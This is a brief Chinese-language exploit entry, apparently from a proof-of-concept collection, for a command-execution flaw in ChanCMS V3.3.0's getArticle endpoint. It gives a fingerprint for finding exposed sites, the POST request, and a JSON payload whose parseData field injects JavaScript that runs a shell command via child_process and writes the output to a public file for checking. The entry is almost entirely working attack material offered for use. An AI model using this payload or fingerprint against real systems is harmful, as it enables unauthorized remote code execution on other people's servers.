# ChanCMSV3.3.0getArticle存在命令执行漏洞

ChanCMSV3 ｜ 命令执行 ｜ —
- **指纹**：`header="Chancms"`
- **请求**：`POST /cms/collect/getArticle HTTP/1.1`

**Payload**
```
"taskUrl": "http://IP/favicon.ico",
"titleTag": "title",
"articleTag": "body",
"parseData": "return (async () => { const { execSync } = await import(/* webpackIgnore: true */ 'child_process'); return execSync('whoami>app/public/666.txt').toString(); })()"
然后访问666.txt
```
- **响应特征**：200